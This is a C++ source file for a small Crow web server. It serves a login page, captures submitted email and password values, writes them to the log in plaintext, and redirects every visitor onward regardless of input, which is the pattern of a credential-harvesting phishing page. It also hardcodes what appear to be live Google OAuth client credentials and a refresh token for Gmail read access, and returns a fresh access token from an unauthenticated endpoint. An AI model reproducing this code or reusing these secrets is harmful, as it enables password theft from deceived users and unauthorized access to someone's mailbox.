#include "phc.hpp"
#include <cpr/cpr.h>

std::unordered_map<std::string, std::string> parse_form_data(const std::string &body) {
  std::unordered_map<std::string, std::string> form_data;
  std::istringstream ss(body);
  std::string pair;

  while (std::getline(ss, pair, '&')) {
    size_t pos = pair.find('=');
    if (pos != std::string::npos) {
      std::string key = pair.substr(0, pos);
      std::string value = pair.substr(pos + 1);

      // Decode URL-encoded characters (e.g., %40 → @)
      for (size_t i = 0; i < value.length(); i++) {
        if (value[i] == '%' && i + 2 < value.length()) {
          int hex = std::stoi(value.substr(i + 1, 2), nullptr, 16);
          value.replace(i, 3, 1, static_cast<char>(hex));
        }
      }

      form_data[key] = value;
    }
  }
  return form_data;
}

crow::response refresh_token() {
  const std::string clientId =
      "896874297417-eprj6ua5k0dghqa66pvacdm36mqjvdcd.apps.googleusercontent.com";
  const std::string clientSecret = "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";
  const std::string refreshToken =
      "1//"
      "0gcOydbf3CRi7CgYIARAAGBASNwF-"
      "L9Irgh5fwbJsZIf4rkZCb0AXSlYt7dWaJ7MZrBxLwHHYT92YyF7rA5ACOLLAINoEO5cDEG4";
  const std::string scope = "https://www.googleapis.com/auth/gmail.readonly";

  // Build request body
  std::string body = "grant_type=refresh_token"
                     "&client_id=" +
                     clientId + "&client_secret=" + clientSecret +
                     "&refresh_token=" + refreshToken + "&scope=" + scope;

  // Make the HTTP POST request
  cpr::Response response = cpr::Post(
      cpr::Url {"https://oauth2.googleapis.com/token"},
      cpr::Header {{"Content-Type", "application/x-www-form-urlencoded"}}, cpr::Body {body}
  );

  // Log response
  CROW_LOG_INFO << "Response status: " << response.status_code;
  CROW_LOG_INFO << "Response body: " << response.text;

  return crow::response(response.status_code, response.text);
}

int main(int argc, char *argv[]) {
  const int port = argc > 1 ? std::atoi(argv[1]) : 8000;
  crow::SimpleApp app;

  crow::mustache::set_global_base("web");

  CROW_ROUTE(app, "/")([]() { return crow::mustache::load_text_unsafe("login.html"); });
  CROW_ROUTE(app, "/api/login")
      .methods(crow::HTTPMethod::POST)([](const crow::request &req) {
        if (req.get_header_value("Content-Type") != "application/x-www-form-urlencoded") {
          auto response = crow::response(crow::status::SEE_OTHER);
          response.set_header("Location", "/invalid");
          return response;
        }

        CROW_LOG_INFO << "Body: " << req.body;
        auto data = parse_form_data(req.body);

        CROW_LOG_INFO << "Email: " << data["email"];
        CROW_LOG_INFO << "Pass: " << data["password"];

        auto response = crow::response(crow::status::SEE_OTHER);
        response.set_header("Location", "/page");
        return response;
      });

  CROW_ROUTE(app, "/api/login")([]() {
    auto response = crow::response(crow::status::SEE_OTHER);
    response.set_header("Location", "/invalid");
    return response;
  });

  CROW_ROUTE(app, "/invalid")([]() {
    return crow::mustache::load_text_unsafe("invalid.html");
  });
  CROW_ROUTE(app, "/page")([]() { return crow::mustache::load_text_unsafe("page.html"); });

  CROW_ROUTE(app, "/api/token")([]() { return refresh_token(); });

  app.port(port).multithreaded().run();
  return 0;
}
